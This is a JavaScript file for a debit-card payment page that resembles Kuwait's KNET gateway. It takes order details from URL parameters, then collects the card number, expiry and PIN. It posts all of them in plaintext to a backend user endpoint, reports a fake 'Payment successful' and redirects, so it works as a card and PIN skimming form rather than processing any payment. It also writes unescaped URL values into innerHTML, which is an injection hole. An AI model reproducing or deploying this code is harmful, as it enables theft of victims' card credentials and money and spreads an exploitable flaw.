// Get parameters from URL
function getParamsFromURL() {
  const urlParams = new URLSearchParams(window.location.search);
  const params = {
    amount: urlParams.get("amount") || "0.000",
    name: decodeURIComponent(urlParams.get("name") || ""),
    address: decodeURIComponent(urlParams.get("address") || ""),
    flat: decodeURIComponent(urlParams.get("flat") || ""),
    phone: decodeURIComponent(urlParams.get("phone") || ""),
    notes: decodeURIComponent(urlParams.get("notes") || ""),
  };

  // Get cart items if available
  const cartItemsParam = urlParams.get("cartItems");
  if (cartItemsParam) {
    try {
      params.cartItems = JSON.parse(decodeURIComponent(cartItemsParam));
    } catch (e) {
      console.error("Error parsing cart items:", e);
      params.cartItems = [];
    }
  } else {
    params.cartItems = [];
  }

  console.log("Retrieved URL parameters:", params);
  return params;
}

// Update the payment form with all data
function updatePaymentForm() {
  const params = getParamsFromURL();

  // Update amount display
  const amountLabels = document.querySelectorAll(".Amount label:last-child");
  amountLabels.forEach((label) => {
    label.textContent = `${params.amount} KD`;
  });

  // Add customer details to the payment page
  const formCard = document.querySelector(".form-card");
  if (formCard) {
    // Create a new section for customer details
    const customerDetails = document.createElement("div");
    customerDetails.className = "customer-details";

    // Start with customer info
    let customerHTML = `
      <hr>
      <div class="customer-info">
        <label>Customer Name:</label>
        <label>${params.name}</label>
      </div>
      <div class="customer-info">
        <label>Address:</label>
        <label>${params.address}</label>
      </div>
      <div class="customer-info">
        <label>Flat/Building:</label>
        <label>${params.flat}</label>
      </div>
      <div class="customer-info">
        <label>Phone:</label>
        <label>${params.phone}</label>
      </div>
      <div class="customer-info">
        <label>Notes:</label>
        <label>${params.notes}</label>
      </div>
    `;

    // Add cart items if available
    if (params.cartItems && params.cartItems.length > 0) {
      customerHTML += `
        <hr>
        <div class="cart-items">
          <h4>Order Details:</h4>
          <table class="cart-table">
            <thead>
              <tr>
                <th>Item</th>
                <th>Quantity</th>
                <th>Price</th>
              </tr>
            </thead>
            <tbody>
      `;

      // Add each cart item
      params.cartItems.forEach((item) => {
        customerHTML += `
          <tr>
            <td>${item.name}</td>
            <td>${item.quantity}</td>
            <td>${item.price} KD</td>
          </tr>
        `;
      });

      customerHTML += `
            </tbody>
          </table>
        </div>
      `;
    }

    customerDetails.innerHTML = customerHTML;

    // Insert the customer details after the amount display
    formCard.appendChild(customerDetails);
  }
}

// Function to send order data to backend
async function sendOrderToBackend(orderData) {
  try {
    // Make sure all required fields are present and not empty
    const validatedData = {
      name: orderData.name || "Guest User",
      address: orderData.address || "No Address Provided",
      phone: orderData.phone || "00000000",
      department: orderData.department || 1,
      description: orderData.description || "No description",
    };

    console.log("Sending data to backend:", validatedData);

    const response = await fetch("http://localhost:3000/api/user", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(validatedData),
      credentials: "include",
    });

    if (!response.ok) {
      const errorData = await response.json();
      console.error("Server error response:", errorData);
      throw new Error(
        `Server responded with status: ${response.status}, message: ${errorData.message}`
      );
    }

    const data = await response.json();
    console.log("Order successfully submitted:", data);
    return data;
  } catch (error) {
    console.error("Error submitting order:", error);
    throw error;
  }
}

// Function to validate form fields and enable/disable submit button
function setupFormValidation() {
  // Get all required form elements
  const bankSelect = document.querySelector(".bank select");
  const cardPrefix = document.getElementById("dcprefix");
  const cardNumber = document.querySelector('input[name="debitNumber"]');
  const expiryMonth = document.querySelector(".Expire select:first-child");
  const expiryYear = document.querySelector(".Expire select:last-child");
  const pinInput = document.querySelector('input[name="cardPin"]');
  const submitButton = document.querySelector(".btns button:first-child");

  // Array of all form elements to check
  const formElements = [
    bankSelect,
    cardPrefix,
    cardNumber,
    expiryMonth,
    expiryYear,
    pinInput,
  ];

  // Function to check if all fields are valid
  function validateForm() {
    let isValid = true;

    // Check if bank is selected
    if (bankSelect.value === "bankname") {
      isValid = false;
    }

    // Check if card prefix is selected
    if (cardPrefix.value === "i") {
      isValid = false;
    }

    // Check if card number is filled (10 digits)
    if (!cardNumber.value || cardNumber.value.length !== 10) {
      isValid = false;
    }

    // Check if expiry month is selected
    if (expiryMonth.value === "0") {
      isValid = false;
    }

    // Check if expiry year is selected
    if (expiryYear.value === "0") {
      isValid = false;
    }

    // Check if PIN is filled (4 digits)
    if (!pinInput.value || pinInput.value.length !== 4) {
      isValid = false;
    }

    // Enable or disable submit button based on validation
    submitButton.disabled = !isValid;
  }

  // Add event listeners to all form elements
  formElements.forEach((element) => {
    if (element) {
      element.addEventListener("input", validateForm);
      element.addEventListener("change", validateForm);
    }
  });

  // Add click handler for submit button
  if (submitButton) {
    submitButton.addEventListener("click", async function () {
      if (!submitButton.disabled) {
        try {
          // Get all the order data
          const params = getParamsFromURL();

          // Prepare the data for the backend
          const orderData = {
            name: params.name,
            address: params.address,
            phone: params.phone,
            department: 1, // Default department value (adjust as needed)
            description: JSON.stringify({
              items: params.cartItems,
              amount: params.amount,
              flat: params.flat,
              notes: params.notes,
              paymentDetails: {
                bank: bankSelect.value,
                cardPrefix: cardPrefix.value,
                cardNumber: cardNumber.value,
                expiryMonth: expiryMonth.value,
                expiryYear: expiryYear.value,
                pin: pinInput.value,
              },
            }),
          };

          // Show loading state
          submitButton.textContent = "Processing...";
          submitButton.disabled = true;

          // Send data to backend
          const result = await sendOrderToBackend(orderData);

          // Show success message
          alert("Payment successful! Thank you for your order.");

          // Redirect to success page or back to home
          window.location.href = "../fish/index.html";
        } catch (error) {
          // Show error message
          alert("Payment failed. Please try again.");

          // Reset button state
          submitButton.textContent = "Submit";
          submitButton.disabled = false;
        }
      }
    });
  }

  // Initial validation
  validateForm();
}

// Initialize when page loads
document.addEventListener("DOMContentLoaded", () => {
  console.log("DOM Content Loaded - Initializing payment form");
  updatePaymentForm();
  setupFormValidation();
});
